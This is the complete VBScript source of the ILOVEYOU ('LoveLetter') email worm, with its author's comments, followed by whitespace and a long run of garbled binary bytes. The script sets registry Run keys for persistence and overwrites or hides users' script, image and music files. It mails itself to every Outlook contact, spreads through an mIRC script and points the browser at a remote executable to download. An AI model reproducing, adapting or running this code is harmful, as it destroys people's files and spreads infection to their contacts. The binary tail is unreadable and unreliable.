rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "ILOVEYOU"
male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub
                                                                                                                                                                                                                                                                                                                                                                                                                                                           ¢©˚∆2#ò6S9´Åªxñ≤ö”p% r‰éMc˛§•∏m_NC|{èChÅzÔﬂªÕê÷PJÅ÷¥¶∆$†¨HÒø'≈•ÙƒèŸˇÒx?ÄÉ¥-≈@ã)1Ñaøß±	m›ˆèãﬂ∂«Ô	)≈Ù8ÛÿÏ˝√xﬁ„gÛ≥1ºg⁄ÌŸÄ1ÿ∆lÜü√036 ÿ6~0€ÿ∆ÔK<∆√∆Ñ`∞± 'åm €< #Ä6H¡`ÿ`` ƒ`B0 @¿ Écc@ [ Äc0@l,Ä 00ÿÄ@ ;0b ` à¡ÄÄîÄ10¿à06F è∏ €`∞¡6»Ä¿@€∂  ¶!¶ !ÜCR‡CtC
pà!≈I±ÌÄ1∏ø€∆<"I1«0©L ¢Õà1qÏ∂"ê+~	JàÌÙp§jHcÑ@ƒ	?åã8œ¬'rí6`'•Äç´sí–R'	·L∞ëJ¢Ü«4$&®iJS%EBÑÇC5≠àLEh¶qk(•jJ#*Üû†ºëBÔÖ$≥T£Hcó$”\°X¡4‰i
≠k5ë#µiú*‚*ÆMDt™-™¨82$â¢EiÿBào'IÍ;F%¥AäIj£âË»DëNãaÄ	°¿H‘¶fLDr2K∏XdÅƒT‰£@62≥THd´ TRr Wl
áP &ô§õŸDCq‚ƒFY“Då`å«LXFÜ,€§©ÜBïd a™Z”VT‰ºHú("	#∫RÈ;IA&LR c0È1ëJCòö	K†&•TC<Ç≈ÎX2§Å(L$ŒA"∑6YÏñ@åAH îh¨aPXFP™Å∞MH#-Ï,<ecì<‚‰,.<ÕzK’ ;+˙üF¢êD5VVI*¶ + äŒ§‰*ùyìj*f»˛(r0›âÅTp∞Eyê¨òÄ X]Uü>¨èõÑÖä•˚Aë\B†‚Â@ûÅ¬y"bñb$.„&1Ü≠¨É·¯˙?kÜ+;Å`rj∆9ÓoQ√	DuäÙ;ûÇN√QöBô·)?
8a
P!Ã-Ü “∆R â'ﬁßR±q√ÑG)1¥úO·œá”«ö	4 =∂Í¢@YäTµÓB¢=¢√Æc-≥@(ß`c÷9‰ZçM&D Ñ/ú	õ®fâ%°áj!µ‹Õ@cö&7˛xû°Œ˚Ñ‚e„”Ò]≠a≈œ…˝ƒPÂa”0¬Èπ S1tß-n±†Äq,I—2q	, A‰ˆ>ä¡cY§å †b;Ï9T(’N—'c &0P§# !w")ãH®–u≠V8nöyUE÷¢Ú£}M∑q≤4Ù1¬Rí¿XvLHXHë)38ìçfèo≥·ŸD*5|b… §Ë\ôçå°¯î=Ë`ô‡ŸìDC'-a◊—I\{p€ƒéîé            @                      @                      @           (   <  
†|n•Ì‹‡»º»®¨†¥ƒ¨¨îúÄ|l\LH|x @(ë`0J Ä%§*`MÑ`Kd4Dìô™@ê»ÿFLJ"9∂ﬂ# ∞p1A9=—ÖÑdÇHÄØƒJ9 «èHDA‚◊ÜE	π°–√ärI,ßA¥Iê8ƒê∆5U®(öë(Ñ(¡†$äH‰x◊√à
ãJ
Oìœá2VŒo-ë)°@!î†=LÂ"Öƒ`–ö¨Ëg·LÊ∫«ç"ëÖ≤“Z¥Dí"µ£âŸ iXè¨Úµ{dEÉ¿‰]V"é¥!ÖpàèA)nE$D,""QC
)± * ê†Lò“ûò+  Ë ©ˆîÜDî∆ù©∆F0Q2"º•
dÛ§g2Øöc»¶b3°Z;√ã@
‡]ï¿%IûÌ‡*krÜ≈5ìQÉ¡é»BŸ	t1qÇDÄà(f°aH…"ä«}83z)\H6S`Â¡ñƒÎ)Púq“¨àè))uTB¥p‡A ’ÿbñî,¸˘¬Øg‰†ﬁpBÇ†	Ã’-ãöäCP*c
#b) å≈ÄÇzèkÑ‡8:*Å(/M0· uïö§§ùe .ß:%(ç∆^:QTD≈®"r¡¨:àa&"ÄD¥∞“#à
≤:3àÀ"T¶I¿H¥à:âDÇ¶Åé‰Tv
Í
Üâ%P1ƒ™$∆U0JáòU( âEr*¿ÊcÊ8)[(õ 
Ç∆P9lcåÒh¢C°!VúaµÁîÉ‚Ö–„H«á6õ—PëÇ(Bâî1@4«•ÃJ·(®
π¥àAùCô®ãÄTÄ8Æ 
GK	CràÖNhA¢I=1ZDQaRRáñâ	¬(’/†ÊµèM4e≤âQíRÆYT4gƒ"Öà”° â©IÇî–òÅƒD#±†û@Ql¡àHVGcB≈∏4pa"%K	 `JV¥+–+¢â®…	S†0N
Q’ı]ã®É bHH)j¢í@'HÄ(iâtUB*›I:HPì4WÑ4BI©"B#ít  5	AUU$àV$ÅÅ$i	IH:MRQß'"í$	IuBBBÍè$Ií$I ù§ì$Ií$Ií$Ií$Iî$Ií$Ií$Ií$Ií$Ií$Ií$I:Ií$Ií$!Ií$Ií$Ií$Ií$Ií$Ií$Ií$Ií$Ií$Ií$Ií$Ií$Iítí$Ií$Ií¸Hí$Ií$Ií$Ií$Ií$IíNí$È$IíN'I'Ií§ì$Ií$I“ùtítßì$Ií$I'I'ù$ù§ì$››ùN∫”ùt'I“›››ÈÓNßª”Iwßªªª;››ÈÓNwwww∫ªªªìÓÓÓtw“È§”-∫ªªª”ùtwww‹ÈNww:›$MÉö¢ªªªª”ùNßªìÜƒ4•!:››È i™5MS—›$U”4MS5Dwß€âB”8MÂê¶i™“TUYMS5M”TÖXMM’TU”t4'vz	ƒ!AVéSU!©™R9ÖTM”ê™!Hww7¥≤M,˙ €ÀXM”ÄÛ48)USô¨RàÉH!Mc9ƒí‰
KF.âUë¶"U„òÜá@i*ÀiB¿*ú(¿âÜ)»!Û.ßq¨Rß´ÅF 
ì|è◊1ëËHdd(*,;%sº†0I˘¯‰‡—\a"”8N#K=)I)J*9à%»RÜéä“äFéäRPÅâN©≥aNπImd0h6ñ§}úQd2íÏ9eT%`,©h ¢∫âM†r]%Ã6˘»QÕX¬rË¥Ë∞,ÌdÏË∞t≠E¶J¥6D÷8u∫∂4≤Xï~ñ	öCJ2⁄É+ªêQ<á2Õ∫ÿ@$Ò&Ç[!ô|≤ã∆Eö ‡1îI/í•ãHUÎ ë[4*âƒV9‡‰8Ña⁄9™¬˚ht†X&F» ß$eòÿ1fÛ˚CÒ#$ Í
â„`Ö""òD¿2ÅM5ˇ\&ÉçtÄÒ –iI•íëllúqìCCà7⁄8Ñº81©ΩóJíá• o·gƒ
3B–Q2◊%ŸZ|‰f SBf9äQCçQn%åê»òçàÑm€AÉR"ªêL±É™†ê:µêÕ∞∆=Ωë8≈Ãç·∞∆H(U›$º/Å·}b8EÑ:õSI0Ÿ@V1I1√ïhP»ÑP∆zã≈1öß»∆ UÊ∞“A¨‹∂Äë¬zX¯¿p‚√'®6Ñ.L*q˛ÄX´:+ÇâJÇra%≤Cl†èmê!Ω‘Ã[LÄÌh!Ê¡uí∆ºQÀ4BÇfäU2∏°S¯J,)b©è®2ÿKjæu≠:“â`fºtˆ0/ÿP¿P~Juj$Œƒ
4LËCN±,…‡‡ÑQq·ÜÖôKà◊1m)åÕIπ≤Æ"dbËp(R:±ÂÉ
¢º†1∫sS’˚»¿÷4egmÌr'
úx#Û_7Xˆ≥mÄ¨∏@î 1∆å¡%Ç£†Y€—-Tå@†dÊÍ´¿%2%¨…s∞Ÿ˛’|ÍgA&hcQ3∏b¡,T ·ÑÇL∞ )	(0BI¬U0–¥(í@|üù%5∏BÄæäìÖ§ RÄxÃ`öÃÍC∆?W~IHÏ±siå4≥&>vëV ñ‚Yÿı‹ÿ–ƒƒ∞¨†¥¿§®î†ÄÄl\PLÑxòDF∆V9≈8
45 Iå e!Bà&b*4(1cÄ Í7i§≠3πõ\∞ˆ.Ç9ßπ]iRÓA"∆J$ŸF≤;AƒC%¢πÑkãy3÷»»ÇZ@Õ©Âí˚mSÒÛÇ‘=≠[≥j“ÚdŸ¸4º±‡Ã Ü∆∂—›bB°í§°±ÊH+ôû20U4†&‚e-≥Í?}WÜFÔr$ØØ&4ImÁzòTRdæ≤ÚÚ2
çGy∂u@z—¿® ƒRvØsbé∂Ãë§ÉÀ@Ä≈π∑¬åE[hòmqQhJ z2öVÊyÈuÜççôÕÅ¸§Î*Ç"ŒÇ‰rBrF∑˝ÃTÓü‹]OlFh+3ñ9y—ºƒ¥Z#äõ.ÙWñVàIADPÅ âí0ãÃe$†§ÿFÀtà+’âÁ BKPÅY2K¨ÅÃºÂéËçD3LYFR =ö.2—põÏÿ›`dhΩÒ^\*5À∏ÄäcéÜ¢ëå!ﬂìIy>"ä•âH‰m√E4kY£ÓÄ∞¿÷XP xA2!1êQmtò4´”L’3j@∂,#+¬ÖR'UﬂA¡@9˙õ≈T·ÂL¢„ üÒ®∫ÜJÜÃWW(U8:\™¢HLäçΩt“çÍñTç <IıN›?µÇõ∑Za—ûATêSÊ∏e*&K ‰ˆ:≈	rÌÿCWœ™∂®ãÆ∆ÿ\ÕGïÙß.ìdŸ¢¨Hõ∞ÿ≤©ö¢˙#Œ”Q@SUaí%—ÒEi≤cí`Ü€Î#◊LÅs®ìJ3Õv‚+/œyW{Ìæv€∏9Ω⁄jZ„ºV°∞X¶ÂIí∏^NÛ’˛zŒ3Ø8_ÕÒfko◊/îÖí[-Lyá-Ôƒ”Çû˘‚2ÖΩ”∏ãws"ô%7:HÉØ"Uõ)∂À<Û∞+ÅTòA2ﬂDVêÆ˜’ˆ÷j-ŒﬂJs≈◊}Øı5VJØÃÆ≥ÚÛˇøÑ∂5•uùæΩ˝˚˝ﬁ?ò˜˚ˇﬂû˝ˇ∂1î∂;ÿ˛ˇ±˜∂ﬂˇ?€~€∂˝˛∆~~∆∂ﬂ∆~Fºﬂ∂ﬂ6J›∂¯ˇÛ¯m ˛ˇˇˇˇˇˇIã©˚„Êˇˇˇﬂ˚ˇ˜ˇˇˇˇˇˇˇˇˇﬁˇˇˇÔˇˇˇˇ˚˜ˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇﬁ~ˇˇˇˇˇøˇˇˇˇˇˇˇˇˇˇˇˇˇ˝˚ˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇ˜ˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇ?˛ˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇˇø˝ˇˇˇˆˇˇ˚ﬂoˇˇøﬂ˛∑˝ˇo˚Ì€ˇ˛˚ﬂÔˇˇ€~€ˇˆˇˇøˇ˝Ôˇ˜ˇ€Ô∑˝∂m˚ﬂo€Ô∑˝ˇˇ∂˝ˇ˛€Ô˜€˛ˇˇ∑m€∂mÔÌ€ˆ€∂O±ﬂ~€~€∂mømƒm€ícøﬂoˇ€∂ˇmÔm€∂˜oÛ∂m˚ﬂ~€oømGZcJ)¶¥•u¡8MÂ÷tˇˇﬁﬁ€~˚6øˇ-H°¶) Nàm€œ§ò'∂ç˝o€ˆø€àq€ 2}TO<Ïü˝∂mø"¶m](n[†òRä1âLÕ,b5m+ÿFJ1b€;RLKùÜpK€8•)ÒõoÒ–‘!mk⁄‘mM[◊≠`oR
º&C9§!ä1'LÜfÏr≤ä±§-NÎ¥é1µ1•-Êu€Ê‘u€öc€ÆqÕX°ä_7±Æl2I"fc#Ê£àSá“6(>é1$–ÑÇ¥dM/ofÊ∑u›pZ(∑kn„ß}‹1úº+
Ve$gÁÊj0!·…,˘Pó!0Å0 a`VëM ≠‚0≥©ù¡Äâhêí*&ë¬	⁄(A(–ıÍçr2%≈0å¶c7ïC—*(ÄåÛúØ∏Y»Ü¿f,1VA:ÍÍb?X  Ea™åËçG£–x˙nÙíqJ∑	Z
i≠3√Î+ΩÎ⁄1ç†ê†ßi—ïÊA6=Áµ*DKtlIBPy‡≤ä4ÿÙ<`3¿qê¶4V°Sé ˙\:-uƒk((,»",1±(¬DK–ƒ‚¢„êiáﬂWNB¢ÈII_gÁñ"®aÄQà«R1§LK«úîU\é2Ñ	(z¶Å$‹Må⁄”ñ∆ C ‡‰l∑K¿Ã\¶`¨¥#?‰‘√C1Ö©pH)ëò=ÚG4ƒï‘≥°»îRªDÔL4‰¥0◊–ßSΩ)[ p)≥*ÑJWê«´	∫Y=Í-ˇ…X≠?Ã£ÜXÕµaåêE($yÖP$„\gù»Ä&†òí PL'µH||£ $Ω—™^
P¨¯¢‚‡´ª¶0Õä^¨#:ç3©càıî4A<A8M»â!“#óã	ÿ°É"€¯ò¿&Á«†∞@°ùâ$≈ëg¢»y
ñ*rIê?ò—pc'
í_'.4)2î@ÇX§¯	1–tj©%¢„ÔÖX√‡¬°ƒ"cëä¢©h§JXKB`±†¢ åç≈‘A&{‘`K£2„± ‘˘&J‘∫¶‚ä[•`¡∫√à2&h…?            @                      @                      @           d     Ùpj·	ÒÏÿ‹–Ã∏∞§∞º§úêò|xpXLPÑÄ ë$èqãiKã¶"A,HÕô·åàD8Aû¨!1*ÍöÅP—Ñı∏Å¬ëHaûˆ^=!ü} âqh¿÷ÜyÊ%›MïéG°Éä09YQ,#ﬁQZ»:W	îƒBU√ÑJéR«áN"Sç∂`ÖkjSÜôá*)ù≠≠íHFáì3aÒ`5cÅC